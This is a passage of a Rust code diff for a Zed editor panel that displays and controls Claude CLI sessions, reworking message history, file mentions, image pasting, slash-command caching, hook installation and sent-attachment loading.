-            reveal: RevealStrategy::NoFocus,
-            env: std::collections::HashMap::default(),
-            ..Default::default()
-        };
-
-        let terminal = project.update(cx, |project, cx| project.create_terminal_task(spawn, cx));
-        self._terminal_attach = cx.spawn_in(window, async move |this, cx| {
-            // A failure leaves the mirror standing in for the terminal, which is what
-            // the reader sees until an attach succeeds.
-            let Some(terminal) = terminal.await.log_err() else {
-                return;
-            };
-            this.update_in(cx, |this, window, cx| {
-                // The reader may have selected another session while this ran; what was
-                // attached for that one is not shown under this one.
-                if this.terminal_process_id != Some(process_id) {
-                    return;
-                }
-                let workspace = this.workspace.clone();
-                let project = project.downgrade();
-                this.terminal =
-                    Some(cx.new(|cx| {
-                        TerminalView::new(terminal, workspace, None, project, window, cx)
-                    }));
-                cx.notify();
-            })
-            .log_err();
-        });
-        cx.notify();
-    }
-
-    /// Collapsing takes the terminal down rather than hiding it: an attached client that
-    /// nobody is looking at still holds the pane's size down to its own.
-    fn toggle_pane_mirror(&mut self, cx: &mut Context<Self>) {
-        self.pane_expanded = !self.pane_expanded;
-        cx.notify();
-    }
-
-    /// Answers a prompt the CLI has drawn in the pane, with one of the keys it is
-    /// waiting for. A prompt is answered in the terminal or not at all, so without this
-    /// a session that stopped to ask something can only be unblocked by leaving Zed.
-    fn send_pane_key(&mut self, key: PaneKey, cx: &mut Context<Self>) {
-        if !self.can_send(cx) {
-            return;
-        }
-
-        self.store.update(cx, |store, cx| {
-            // There is no text to hand back for a keypress, and the store reports the
-            // failure itself, so nothing here waits for the answer.
-            store.send_input(SessionInput::Key(key), cx).detach()
-        });
-    }
-
-    /// Quits the session's CLI, as Ctrl+D does in the terminal — but only on the second
-    /// press.
-    ///
-    /// The first press arms the button and sends nothing. This ends the session, and a
-    /// session ended by a stray click cannot be got back: what it was doing is over, and
-    /// what it knew is only in its transcript.
-    fn quit_session(&mut self, cx: &mut Context<Self>) {
-        if !self.can_send(cx) {
-            return;
-        }
-
-        if !self.quit_armed {
-            self.quit_armed = true;
-            cx.notify();
-            return;
-        }
-
-        self.quit_armed = false;
-        self.send_pane_key(PaneKey::Quit, cx);
+        cx.write_to_clipboard(ClipboardItem::new_string(channel_setup_commands(home)));
     }
 
     /// Puts the previous message sent to this session in the box, as Up does in the
@@ -1694,7 +2460,12 @@ impl ClaudeSessionsPanel {
             return;
         }
 
-        let history = message_history(&self.entries);
+        let store = self.store.read(cx);
+        let history = message_history_for(
+            &self.pending_sends,
+            store.main_transcript(),
+            store.selected(),
+        );
         let typed = self.message_editor.read(cx).text(cx);
         let step = step_back_through_history(&history, self.history_index, &typed);
         self.take_history_step(step, window, cx);
@@ -1713,7 +2484,12 @@ impl ClaudeSessionsPanel {
             return;
         }
 
-        let history = message_history(&self.entries);
+        let store = self.store.read(cx);
+        let history = message_history_for(
+            &self.pending_sends,
+            store.main_transcript(),
+            store.selected(),
+        );
         let typed = self.message_editor.read(cx).text(cx);
         let step = step_forward_through_history(&history, self.history_index, &typed);
         self.take_history_step(step, window, cx);
@@ -1721,9 +2497,6 @@ impl ClaudeSessionsPanel {
 
     /// The files the `@` menu is offering, or `None` when nothing is being named.
     ///
-    /// Listing runs on the machine the session runs on, so what is returned is whatever
-    /// the last answer was — kept beside the query it answered, so that the menu never
-    /// offers one query's files under another's name.
     fn offered_files(&self, cx: &Context<Self>) -> Option<Vec<SharedString>> {
         if !self.can_send(cx) {
             return None;
@@ -1733,25 +2506,29 @@ impl ClaudeSessionsPanel {
             return None;
         }
         let named = file_being_named(&typed)?;
-
-        if self.file_matches_for.as_deref() != Some(named) || self.file_matches.is_empty() {
+        let offered = matching_files(&self.file_matches, named);
+        if offered.is_empty() {
             return None;
         }
-        Some(self.file_matches.clone())
+        Some(offered)
     }
 
     /// Asks the machine the session runs on for the files a newly typed `@` names.
     ///
-    /// Called after every change to the box rather than on a timer: the walk is bounded
-    /// on the other side, and a menu that lags the typing by a beat is one that offers
-    /// the wrong files.
     fn list_files_for_mention(&mut self, cx: &mut Context<Self>) {
         let typed = self.message_editor.read(cx).text(cx);
-        let Some(named) = file_being_named(&typed).map(str::to_string) else {
-            self.file_matches.clear();
-            self.file_matches_for = None;
+        let named = file_being_named(&typed)
+            .filter(|named| !named.is_empty())
+            .map(str::to_string);
+        self.list_files_for_query(named, cx);
+    }
+
+    fn list_files_for_query(&mut self, named: Option<String>, cx: &mut Context<Self>) {
+        self.file_query = named.clone();
+        let Some(named) = named else {
             self.file_highlight = 0;
             self._listing_files = Task::ready(());
+            cx.notify();
             return;
         };
         if self.file_matches_for.as_deref() == Some(named.as_str()) {
@@ -1761,15 +2538,31 @@ impl ClaudeSessionsPanel {
         let Some(directory) = self.store.read(cx).session_directory() else {
             return;
         };
-        let list = self.source.list_session_files(directory, named.clone());
+        let Some(session_id) = self.store.read(cx).selected().map(str::to_string) else {
+            return;
+        };
+        let source = self.source.clone();
         self._listing_files = cx.spawn(async move |this, cx| {
+            cx.background_executor().timer(FILE_LIST_DEBOUNCE).await;
+            let still_current = this
+                .read_with(cx, |this, cx| {
+                    this.file_query.as_deref() == Some(named.as_str())
+                        && this.store.read(cx).selected() == Some(session_id.as_str())
+                })
+                .unwrap_or(false);
+            if !still_current {
+                return;
+            }
+            let list = source.list_session_files_in(session_id.clone(), directory, named.clone());
             let Ok(paths) = list.await else {
                 return;
             };
             this.update(cx, |this, cx| {
                 // Checked again here: the reader has typed on while this was in flight,
                 // and an answer to a query they have left is not the menu they want.
-                if file_being_named(&this.message_editor.read(cx).text(cx)) != Some(&named) {
+                if this.file_query.as_deref() != Some(named.as_str())
+                    || this.store.read(cx).selected() != Some(session_id.as_str())
+                {
                     return;
                 }
                 this.file_matches = paths.into_iter().map(SharedString::from).collect();
@@ -1850,18 +2643,20 @@ impl ClaudeSessionsPanel {
             return;
         };
 
-        let name = format!(
-            "pasted-{}.{}",
-            now_millis().max(0),
-            image.format.extension()
-        );
+        let name = pasted_file_name(now_millis(), image.format.extension(), &image.bytes);
+        let session_directory = self.store.read(cx).session_directory();
         let write = self.source.write_session_file(name, image.bytes);
         self._pasting = cx.spawn_in(window, async move |this, cx| {
             let written = write.await;
             this.update_in(cx, |this, window, cx| match written {
-                Ok(path) => this.put_path_in_message_box(&path, window, cx),
+                Ok(path) => {
+                    this.paste_error = None;
+                    let path =
+                        pasted_path_for_message(Path::new(&path), session_directory.as_deref());
+                    this.put_path_in_message_box(&path, window, cx);
+                }
                 Err(error) => {
-                    this.hook_install_note =
+                    this.paste_error =
                         Some(SharedString::from(format!("Pasting the image: {error:#}")));
                     cx.notify();
                 }
@@ -1870,19 +2665,10 @@ impl ClaudeSessionsPanel {
         });
     }
 
-    /// Appends a path to what is in the box, which is what a pasted file is in a message.
+    /// Inserts a path at the caret, which is what a pasted file is in a message.
     fn put_path_in_message_box(&mut self, path: &str, window: &mut Window, cx: &mut Context<Self>) {
-        let typed = self.message_editor.read(cx).text(cx);
-        let separator = if typed.is_empty() || typed.ends_with(char::is_whitespace) {
-            ""
-        } else {
-            " "
-        };
-        let text = format!("{typed}{separator}{path} ");
-
         self.message_editor.update(cx, |editor, cx| {
-            editor.set_text(text, window, cx);
-            editor.move_to_end(&Default::default(), window, cx);
+            editor.insert(&format!("{path} "), window, cx);
         });
         cx.notify();
     }
@@ -1956,14 +2742,44 @@ impl ClaudeSessionsPanel {
     /// which for a first read is nothing and for a later one is still true enough to
     /// choose from.
     fn load_slash_commands(&mut self, cx: &mut Context<Self>) {
-        let list = self.source.list_slash_commands(self.project_root.clone());
-        self._listing_slash_commands = cx.spawn(async move |this, cx| {
-            let Ok(commands) = list.await else {
+        let (session_id, session_directory) = {
+            let store = self.store.read(cx);
+            let Some(session_id) = store.selected().map(str::to_string) else {
                 return;
             };
-            this.update(cx, |this, cx| {
-                this.slash_commands = commands;
-                cx.notify();
+            let Some(session_directory) = store.session_directory() else {
+                return;
+            };
+            (session_id, session_directory)
+        };
+        if self.slash_commands_fresh
+            && self.slash_commands_for.as_deref() == Some(session_id.as_str())
+        {
+            return;
+        }
+        self.slash_commands_fresh = true;
+        self.slash_commands_for = Some(session_id.clone());
+        let list = self
+            .source
+            .list_slash_commands_for(Some(session_directory), Some(session_id.clone()));
+        self._listing_slash_commands = cx.spawn(async move |this, cx| {
+            let commands = list.await.log_err();
+            if let Some(commands) = commands {
+                this.update(cx, |this, cx| {
+                    if this.store.read(cx).selected() == Some(session_id.as_str()) {
+                        this.slash_commands = commands;
+                        cx.notify();
+                    }
+                })
+                .log_err();
+            }
+            cx.background_executor()
+                .timer(SLASH_COMMAND_CACHE_DURATION)
+                .await;
+            this.update(cx, |this, _| {
+                if this.slash_commands_for.as_deref() == Some(session_id.as_str()) {
+                    this.slash_commands_fresh = false;
+                }
             })
             .log_err();
         });
@@ -2013,30 +2829,31 @@ impl ClaudeSessionsPanel {
         cx.notify();
     }
 
-    /// Installs the hook that records waiting questions on the machine the sessions run
-    /// on.
-    ///
-    /// What it did stays on screen afterwards: it changed a file the user owns, and where
-    /// the copy of it went is the thing they would want to know. A session already
-    /// running may have read its settings before this, so the note says so rather than
-    /// leaving a reader wondering why nothing changed.
-    fn install_question_hook(&mut self, cx: &mut Context<Self>) {
-        let install = self.store.read(cx).install_question_hook();
+    fn install_hooks(&mut self, cx: &mut Context<Self>) {
+        let install = self.store.update(cx, |store, cx| store.install_hooks(cx));
 
         self.hook_install_note = Some(SharedString::from("Installing…"));
         self._installing_hook = cx.spawn(async move |this, cx| {
             let result = install.await;
             this.update(cx, |this, cx| {
                 this.hook_install_note = Some(match result {
-                    Ok(Some(backup)) => SharedString::from(format!(
-                        "Installed. Your settings were copied to {}. Sessions already \
-                         running pick it up when they next start.",
-                        backup.display()
-                    )),
-                    Ok(None) => SharedString::from(
-                        "Installed. Sessions already running pick it up when they next \
-                         start.",
+                    Ok(HookInstallOutcome::AlreadyCurrent) => {
+                        SharedString::from("Hooks are up to date")
+                    }
+                    Ok(HookInstallOutcome::ScriptsRefreshed) => SharedString::from(
+                        "Hook scripts updated; restart Claude to pick them up",
                     ),
+                    Ok(HookInstallOutcome::Installed { backup_path: Some(backup) }) => {
+                        SharedString::from(format!(
+                            "Hooks installed (settings backed up to {}); restart Claude to pick them up",
+                            backup.display()
+                        ))
+                    }
+                    Ok(HookInstallOutcome::Installed { backup_path: None }) => {
+                        SharedString::from(
+                            "Hooks installed; restart Claude to pick them up",
+                        )
+                    }
                     Err(error) => SharedString::from(format!("Could not install: {error:#}")),
                 });
                 cx.notify();
@@ -2046,146 +2863,20 @@ impl ClaudeSessionsPanel {
         cx.notify();
     }
 
-    /// The question the selected session is waiting on, and which of its questions is
-    /// being asked.
-    ///
-    /// A question the hook recorded is only waiting until its call is answered: the hook
-    /// records a question being asked and has no way to record it being answered, so a
-    /// file left behind by an answered call is told apart by the conversation having the
-    /// result that answers it.
-    fn waiting_question(&self, cx: &Context<Self>) -> Option<(Question, usize, SharedString)> {
-        let store = self.store.read(cx);
-        let recorded = store.recorded_question()?;
-        if call_is_answered(store.main_transcript(), &recorded.tool_use_id) {
-            return None;
-        }
+    fn uninstall_hooks(&mut self, cx: &mut Context<Self>) {
+        let uninstall = self.store.update(cx, |store, cx| store.uninstall_hooks(cx));
 
-        let index = question_being_asked(
-            store.pane_contents().map(SharedString::as_ref),
-            &recorded.questions,
-        );
-        let question = recorded.questions.get(index)?.clone();
-        Some((
-            question,
-            index,
-            SharedString::from(recorded.tool_use_id.clone()),
-        ))
-    }
-
-    /// Answers the question on screen by picking one option, which a numbered menu takes
-    /// as the whole answer.
-    fn pick_option(&mut self, option_index: usize, cx: &mut Context<Self>) {
-        let Some(keys) = keys_for_single_choice(option_index) else {
-            return;
-        };
-        self.send_answer(keys, cx);
-    }
-
-    /// Ticks or unticks one option of a question that takes several. Nothing is sent: the
-    /// answer leaves when it is submitted.
-    fn toggle_tick(&mut self, option_index: usize, cx: &mut Context<Self>) {
-        let Some((_, question_index, tool_use_id)) = self.waiting_question(cx) else {
-            return;
-        };
-
-        let ticked = match &mut self.ticked {
-            Some(ticked)
-                if ticked.tool_use_id == tool_use_id && ticked.question_index == question_index =>
-            {
-                ticked
-            }
-            // Ticks belong to the question they were made on, so a different question —
-            // or a different call — starts an answer of its own rather than inheriting.
-            _ => self.ticked.insert(TickedAnswer {
-                tool_use_id,
-                question_index,
-                ticked: HashSet::default(),
-            }),
-        };
-
-        if !ticked.ticked.remove(&option_index) {
-            ticked.ticked.insert(option_index);
-        }
-        cx.notify();
-    }
-
-    fn submit_ticked(&mut self, cx: &mut Context<Self>) {
-        let Some((question, question_index, tool_use_id)) = self.waiting_question(cx) else {
-            return;
-        };
-        let option_count = question.options.len();
-
-        let Some(ticked) = self.ticked.as_ref().filter(|ticked| {
-            ticked.tool_use_id == tool_use_id && ticked.question_index == question_index
-        }) else {
-            return;
-        };
-        let Some(keys) = keys_for_several_choices(&ticked.ticked, option_count) else {
-            return;
-        };
-
-        self.ticked = None;
-        self.send_answer(keys, cx);
-    }
-
-    /// Takes the reader to typing their own answer, which the terminal offers as one more
-    /// row below the options it was given.
-    fn answer_in_own_words(&mut self, cx: &mut Context<Self>) {
-        let Some((question, question_index, tool_use_id)) = self.waiting_question(cx) else {
-            return;
-        };
-        let already_ticked = self
-            .ticked
-            .as_ref()
-            .filter(|ticked| {
-                ticked.tool_use_id == tool_use_id && ticked.question_index == question_index
+        self.hook_install_note = Some(SharedString::from("Uninstalling…"));
+        self._installing_hook = cx.spawn(async move |this, cx| {
+            let result = uninstall.await;
+            this.update(cx, |this, cx| {
+                this.hook_install_note = Some(uninstall_hooks_note(result));
+                cx.notify();
             })
-            .map(|ticked| ticked.ticked.clone())
-            .unwrap_or_default();
-        let Some(keys) = keys_for_own_words(
-            &already_ticked,
-            question.options.len(),
-            question.multi_select,
-        ) else {
-            return;
-        };
-
-        // The ticks have left with the answer; a question drawn again after this starts
-        // its own.
-        self.ticked = None;
-
-        self.typing_answer_for = Some(tool_use_id);
-        self.input_expanded = true;
-        self.send_answer(keys, cx);
-    }
-
-    /// Keys one answer into the pane, one key at a time.
-    ///
-    /// Sequenced rather than sent at once because the terminal reads each key against the
-    /// menu it has drawn, and held in a field so that a second press replaces the first
-    /// instead of interleaving with it.
-    fn send_answer(&mut self, keys: Vec<PaneKey>, cx: &mut Context<Self>) {
-        if !self.can_send(cx) {
-            return;
-        }
-
-        let store = self.store.clone();
-        self._answering = cx.spawn(async move |_, cx| {
-            for key in keys {
-                // The store has gone, or the send failed and the store has already
-                // reported it. Either way the rest of the sequence would be answering a
-                // menu that is no longer the one it was built for.
-                let sent =
-                    store.update(cx, |store, cx| store.send_input(SessionInput::Key(key), cx));
-                if sent.await.is_err() {
-                    return;
-                }
-                cx.background_executor().timer(ANSWER_KEY_INTERVAL).await;
-            }
+            .log_err();
         });
         cx.notify();
     }
-
     fn toggle_input(&mut self, cx: &mut Context<Self>) {
         self.input_expanded = !self.input_expanded;
         cx.notify();
@@ -2199,8 +2890,12 @@ impl ClaudeSessionsPanel {
     /// can close it again and have it stay closed.
     fn open_the_input_for_a_new_question(&mut self, cx: &mut Context<Self>) {
         let asking = self
-            .waiting_question(cx)
-            .map(|(_, _, tool_use_id)| tool_use_id);
+            .store
+            .read(cx)
+            .live()
+            .pending_question
+            .as_ref()
+            .map(|question| SharedString::from(question.tool_use_id.clone()));
         if self.opened_input_for_question == asking {
             return;
         }
@@ -2216,9 +2911,9 @@ impl ClaudeSessionsPanel {
     }
 
     /// Folds one session's agent rows away, or brings them back.
-    fn toggle_session_agents(&mut self, process_id: u32, cx: &mut Context<Self>) {
-        if !self.collapsed_session_agents.remove(&process_id) {
-            self.collapsed_session_agents.insert(process_id);
+    fn toggle_session_agents(&mut self, session_id: String, cx: &mut Context<Self>) {
+        if !self.collapsed_session_agents.remove(&session_id) {
+            self.collapsed_session_agents.insert(session_id);
         }
         cx.notify();
     }
@@ -2252,6 +2947,62 @@ impl ClaudeSessionsPanel {
         cx.notify();
     }
 
+    fn toggle_turn_summary(&mut self, turn_id: SharedString, cx: &mut Context<Self>) {
+        if !self.expanded.remove(&turn_id) {
+            self.expanded.insert(turn_id);
+        }
+        self.rebuild_entries(cx);
+        cx.notify();
+    }
+
+    fn toggle_now_row(&mut self, cx: &mut Context<Self>) {
+        self.now_row_expanded = !self.now_row_expanded;
+        cx.notify();
+    }
+
+    fn request_interrupt(&mut self, cx: &mut Context<Self>) {
+        if !self.store.read(cx).can_interrupt() {
+            return;
+        }
+        let now_ms = now_millis();
+        if interrupt_is_awaiting_result(self.interrupt_sent_at_ms, now_ms) {
+            return;
+        }
+        self.interrupt_sent_at_ms = Some(now_ms);
+        let task = self.store.update(cx, |store, cx| store.interrupt(cx));
+        task.detach_and_log_err(cx);
+        cx.notify();
+    }
+
+    fn on_live_message_drag_move(
+        &mut self,
+        event: &DragMoveEvent<DraggedLiveMessageDivider>,
+        window: &mut Window,
+        cx: &mut Context<Self>,
+    ) {
+        let (start_y, start_height) = match self.live_message_drag {
+            Some(drag) => drag,
+            None => {
+                let start = (event.event.position.y, self.live_message_height);
+                self.live_message_drag = Some(start);
+                start
+            }
+        };
+        let delta = event.event.position.y - start_y;
+        self.live_message_height = clamp_live_message_height(
+            start_height - delta,
+            window.rem_size(),
+            window.bounds().size.height,
+        );
+        cx.notify();
+    }
+
+    fn forget_live_message_markdown(&mut self) {
+        if let Some(old_key) = self.live_message_markdown_key.take() {
+            self.markdowns.remove(&old_key);
+        }
+    }
+
     fn toggle_full_history(&mut self, cx: &mut Context<Self>) {
         self.show_full_history = !self.show_full_history;
         // A different path is a different conversation as far as the list is concerned;
@@ -2277,10 +3028,35 @@ impl ClaudeSessionsPanel {
     fn rebuild_entries(&mut self, cx: &mut Context<Self>) {
         self.refresh_entry_cache(cx);
 
+        // Rebind first: a just-cleared session's rows must follow the new id, not be
+        // marked failed because the old id is no longer live.
+        let rebinds = self
+            .store
+            .update(cx, |store, _cx| store.take_cleared_rebinds());
+        for (old_session_id, new_session_id) in rebinds {
+            self.pending_sends.rebind(&old_session_id, &new_session_id);
+        }
+        {
+            let store = self.store.read(cx);
+            self.pending_sends.fail_in_flight_of_unknown_sessions(
+                store
+                    .sessions()
+                    .iter()
+                    .map(|session| session.session.session_id.as_str())
+                    .chain(
+                        store
+                            .ended_sessions()
+                            .iter()
+                            .map(|ended| ended.session_id.as_str()),
+                    ),
+            );
+        }
+        self.pending_sends.evict_finished_over_bound();
+
         // Moved out for the duration of the build so that the transcript can be borrowed
         // from the store, which is reached through `self`, at the same time.
         let mut cache = std::mem::take(&mut self.entry_cache);
-        let (mut new_entries, activity, agent_calls, sent_to_the_session) = {
+        let (mut new_entries, activity, agent_calls, patched_calls, sent_to_the_session) = {
             let store = self.store.read(cx);
             let home_directory = store.home_directory();
             let transcript = store.transcript();
@@ -2294,79 +3070,115 @@ impl ClaudeSessionsPanel {
             // conversation on screen: both are read from the session's own conversation
             // whichever one the reader has open.
             let session_path = store.main_transcript().active_path();
-            // Derived here, where the paths have already been walked: the panel is drawn
-            // far more often than the transcript changes, and this is the only place the
-            // transcript is read.
+            let live = store.live();
+            let activity = if live.last_event_at_ms == 0 {
+                activity(&session_path)
+            } else if let Some(tool) = live.running_tools.last() {
+                Activity::RunningTool {
+                    name: SharedString::from(tool.name.clone()),
+                    target: tool_target(&serde_json::json!({
+                        "name": tool.name,
+                        "input": tool.input,
+                    })),
+                }
+            } else if matches!(live.turn, Turn::Running { .. }) {
+                Activity::Thinking
+            } else {
+                Activity::Idle
+            };
+            let walk_the_session = self.pending_sends.has_row_for(store.selected());
+            #[cfg(test)]
+            if walk_the_session {
+                self.pending_sends.session_transcript_walks = self
+                    .pending_sends
+                    .session_transcript_walks
+                    .saturating_add(1);
+            }
             (
                 build_entries(&path, home_directory, &mut cache),
-                activity(&session_path),
+                activity,
                 agent_calls(&path),
-                // Read only while a message is waiting, which is rare and brief; see
+                calls_answered_with_a_patch(&path),
+                // Read only while a message of this session is waiting. A Failed row
+                // left in another session must not keep walking this transcript; see
                 // [`user_message_entries`].
-                (!self.pending_sends.is_empty()).then(|| user_message_entries(&session_path)),
+                walk_the_session.then(|| user_message_entries(&session_path)),
             )
         };
         self.entry_cache = cache;
         self.activity = activity;
         self.agent_calls = agent_calls;
+        self.patched_calls = patched_calls;
 
-        // Dropped after the build rather than skipped during it, so that the cache still
-        // holds every record's artifacts and showing them again costs no rederivation.
-        // The chips above stay: which agents a turn started is read from the calls, not
-        // from the entries, so hiding these does not hide those.
-        if !self.show_tool_calls {
-            new_entries.retain(|entry| {
-                !matches!(
-                    entry.kind,
-                    EntryKind::ToolUse { .. }
-                        | EntryKind::ToolResult { .. }
-                        | EntryKind::Thinking { .. }
-                )
-            });
+        let turn_running = matches!(self.store.read(cx).live().turn, Turn::Running { .. });
+        if !turn_running {
+            self.interrupt_sent_at_ms = None;
+        }
+        new_entries = collapse_turns(
+            new_entries,
+            &self.expanded,
+            self.show_tool_calls,
+            turn_running,
+            &self.agent_calls,
+            &self.entry_cache.timestamps,
+        );
+
+        // Answer state is aimed at one call, not at "something is pending": the tool a
+        // reader allowed can finish and the next permission be asked for inside a single
+        // poll, and the prompt that arrives then has been answered by nobody.
+        let (asking_permission, asking_question) = {
+            let live = self.store.read(cx).live();
+            (
+                live.pending_permission
+                    .as_ref()
+                    .map(|permission| SharedString::from(permission.tool_use_id.clone())),
+                live.pending_question
+                    .as_ref()
+                    .map(|question| SharedString::from(question.tool_use_id.clone())),
+            )
+        };
+        if self.permission_answered_for != asking_permission {
+            self.permission_answered = false;
+            self.permission_answered_for = None;
+        }
+        if self.ticked_question != asking_question {
+            self.question_ticks.clear();
+            self.ticked_question = asking_question;
         }
 
-        self.pending_sends
-            .retain_session(self.store.read(cx).selected());
-        // Paired against the session's own conversation and never against an agent's: an
-        // agent is given its task as a user record of its own conversation, so an agent's
-        // records hold the very text a send carries, and a pairing there would take down a
-        // message that had never arrived. Against records only, so that a pending message
-        // is never paired with another pending message and nothing derived from one
-        // reaches the entry cache.
-        if let Some(sent_to_the_session) = sent_to_the_session {
-            self.pending_sends.pair_with(&sent_to_the_session);
+        let selected = self.store.read(cx).selected().map(str::to_string);
+        if let (Some(session_id), sent_to_the_session) = (selected.as_deref(), sent_to_the_session)
+        {
+            self.pending_sends.pair_with_channel_for(
+                self.store.read(cx).channel_events(),
+                now_millis(),
+                session_id,
+            );
+            // Paired against the session's own conversation and never against an agent's: an
+            // agent is given its task as a user record of its own conversation, so an agent's
+            // records hold the very text a send carries, and a pairing there would take down a
+            // message that had never arrived. Against records only, so that a pending message
+            // is never paired with another pending message and nothing derived from one
+            // reaches the entry cache. Only this session's rows: another session's in-flight
+            // send can carry the same text, and an echo here must not take that one down.
+            if let Some(sent_to_the_session) = sent_to_the_session {
+                self.pending_sends
+                    .pair_with_session(&sent_to_the_session, session_id);
+            }
         }
         if pending_is_drawn_in(self.store.read(cx).transcript_target()) {
-            new_entries.extend(self.pending_sends.entries());
+            new_entries.extend(self.pending_sends.entries_for(selected.as_deref()));
             // Drawn after the pending sends and behind the same rule, because both are
             // messages that have not reached the conversation yet. A message sent from
             // Zed is in the session's queue as well, and is already drawn as a pending
             // send — the one the panel can take down when the send fails — so the queue
             // entry matching it is left to that.
             let store = self.store.read(cx);
-            new_entries.extend(
-                store
-                    .transcript()
-                    .queued_messages()
-                    .iter()
-                    .filter(|text| !self.pending_sends.holds_text(text))
-                    // A background task reporting in is queued exactly as a message
-                    // typed mid-turn is, and its text is nothing but the block the CLI
-                    // wrote to tell itself. Held to the same rule as the conversation's
-                    // own records — what is left once the injected blocks are cut — so a
-                    // notification is dropped and typed words, which are never one of
-                    // those blocks, are kept whole.
-                    .filter_map(|text| user_visible_text(text))
-                    .map(|text| Entry {
-                        // Keyed on the text: the queue log gives these no id of their own,
-                        // and the key has to be the same across rebuilds or the list
-                        // remeasures an item that did not change.
-                        key: SharedString::from(format!("queued-{text}")),
-                        kind: EntryKind::Queued {
-                            text: SharedString::from(text),
-                        },
-                    }),
-            );
+            new_entries.extend(queued_entries(
+                store.transcript().queued_messages(),
+                &self.pending_sends,
+                selected.as_deref(),
+            ));
         }
 
         let old_length = self.entries.len();
@@ -2419,6 +3231,12 @@ impl ClaudeSessionsPanel {
         self.expanded.retain(|key| live_keys.contains(key));
         self.loaded_outputs.retain(|key, _| live_keys.contains(key));
         self.output_loads.retain(|key, _| live_keys.contains(key));
+        self.dispatch_prompts
+            .retain(|key, _| live_keys.contains(key));
+        self.loaded_attachments
+            .retain(|key, _| live_keys.contains(key));
+        self.attachment_loads
+            .retain(|key, _| live_keys.contains(key));
         self.entry_cache.retain_keys(&live_keys);
 
         if was_scrolled_to_end {
@@ -2463,25 +3281,10 @@ impl ClaudeSessionsPanel {
     /// Every key that may address a cached artifact, including the attachment keys that
     /// live inside the single context entry rather than being entries themselves.
     fn live_cache_keys(&self) -> HashSet<SharedString> {
-        let mut keys = HashSet::default();
-        for entry in &self.entries {
-            keys.insert(entry.key.clone());
-            match &entry.kind {
-                // An output is clamped behind an expansion key of its own, which has to
-                // survive the rebuild that runs on every change to the transcript, or an
-                // output the reader has opened closes itself four times a second while
-                // the session is answering.
-                EntryKind::ToolResult { .. } => {
-                    keys.insert(output_expansion_key(&entry.key));
-                }
-                EntryKind::Attachments { items } => {
-                    for item in items {
-                        keys.insert(item.key.clone());
-                        keys.insert(output_expansion_key(&item.key));
-                    }
-                }
-                _ => {}
-            }
+        let mut keys = live_cache_keys(&self.entries);
+        keys.insert(SharedString::from(NOW_ROW_ENTRY_KEY));
+        if let Some(key) = &self.live_message_markdown_key {
+            keys.insert(key.clone());
         }
         keys
     }
@@ -2556,6 +3359,124 @@ impl ClaudeSessionsPanel {
         cx.notify();
     }
 
+    /// The session the conversation on screen belongs to, which is the session whose
+    /// working directory a sent file is judged against.
+    fn selected_session(&self, cx: &App) -> Option<RegisteredSession> {
+        let store = self.store.read(cx);
+        store.selected_session().cloned()
+    }
+
+    /// Fetches a sent image from the machine the session runs on.
+    ///
+    /// Started from the draw of the entry that shows it rather than from a button: an
+    /// image is what the session sent, and one behind a button is one the reader has to
+    /// be told to ask for. The states in `loaded_attachments` are what stops the draw
+    /// after this one starting the read again.
+    fn load_sent_image(
+        &mut self,
+        key: SharedString,
+        file: &SentFile,
+        entry_index: usize,
+        cx: &mut Context<Self>,
+    ) {
+        if self.loaded_attachments.contains_key(&key) {
+            return;
+        }
+        let Some(session) = self.selected_session(cx) else {
+            return;
+        };
+        let Some(format) = sent_image_format(file) else {
+            return;
+        };
+
+        self.loaded_attachments
+            .insert(key.clone(), AttachmentLoad::Loading);
+        let max_bytes = if self.forced_attachment_loads.contains(&key) {
+            MAX_SENT_IMAGE_BYTES_ABSOLUTE
+        } else {
+            MAX_SENT_IMAGE_BYTES
+        };
+        let read = self
+            .source
+            .read_attachment(session.session_id, file.path.clone(), max_bytes);
+        let load = cx.spawn({
+            let key = key.clone();
+            async move |this, cx| {
+                let result = read.await;
+                this.update(cx, |this, cx| {
+                    let load = match result {
+                        // A truncated read is a prefix of the file, and a prefix of an
+                        // image decodes into nothing recognizable, so it is reported as
+                        // the size limit it is rather than as a broken image.
+                        Ok(contents) if contents.truncated => {
+                            AttachmentLoad::Failed(SharedString::from(format!(
+                                "larger than the {} this panel will fetch",
+                                describe_byte_count(max_bytes)
+                            )))
+                        }
+                        Ok(contents) if contents.bytes.is_empty() => {
+                            AttachmentLoad::Failed(SharedString::from("the file is empty"))
+                        }
+                        Ok(contents) => AttachmentLoad::Loaded(Arc::new(Image::from_bytes(
+                            format,
+                            contents.bytes,
+                        ))),
+                        Err(error) => AttachmentLoad::Failed(format!("{error:#}").into()),
+                    };
+                    this.loaded_attachments.insert(key, load);
+                    this.list_state
+                        .remeasure_items(entry_index..entry_index.saturating_add(1));
+                    cx.notify();
+                })
+                .log_err();
+            }
+        });
+        // Held so that the read is cancelled if the entry it belongs to goes away.
+        self.attachment_loads.insert(key, load);
+    }
+
+    fn open_sent_path(&mut self, path: PathBuf, cx: &mut Context<Self>) {
+        let Some(session) = self.selected_session(cx) else {
+            return;
+        };
+        if !sent_path_is_openable(&path, &session.working_directory) {
+            return;
+        }
+
+        if !self.source.is_remote() && path.exists() {
+            cx.open_with_system(&path);
+            return;
+        }
+
+        let file_name = path
+            .file_name()
+            .map(|name| name.to_string_lossy().into_owned())
+            .unwrap_or_else(|| "sent-file".to_string());
+        let read =
+            self.source
+                .read_attachment(session.session_id, path, MAX_SENT_IMAGE_BYTES_ABSOLUTE);
+        let open = cx.spawn(async move |this, cx| {
+            let result = read.await;
+            this.update(cx, |_, cx| match result {
+                Ok(contents) => {
+                    let temp = std::env::temp_dir().join(file_name);
+                    if std::fs::write(&temp, &contents.bytes)
+                        .map_err(|error| anyhow::anyhow!("writing sent file to temp: {error}"))
+                        .log_err()
+                        .is_some()
+                    {
+                        cx.open_with_system(&temp);
+                    }
+                }
+                Err(error) => {
+                    Err::<(), _>(error).log_err();
+                }
+            })
+            .log_err();
+        });
+        open.detach();
+    }
+
     fn display_working_directory(&self, working_directory: &Path) -> SharedString {
         if let Some(project_root) = self.project_root.as_deref() {
             if let Ok(relative) = working_directory.strip_prefix(project_root) {
@@ -2576,55 +3497,60 @@ impl ClaudeSessionsPanel {
 
     fn render_session_section(&mut self, cx: &mut Context<Self>) -> impl IntoElement {
         let store = self.store.read(cx);
-        let sessions = store.sessions().to_vec();
-        let selected_process_id = store.selected();
+        let rows = store.session_rows();
+        let selected = store.selected().map(str::to_string);
         let error = store.error().cloned();
-        let selected_name = sessions
-            .iter()
-            .find(|session| selected_process_id == Some(session.process_id))
-            .map(|session| {
-                session
-                    .name
-                    .clone()
-                    .unwrap_or_else(|| session.session_id.clone())
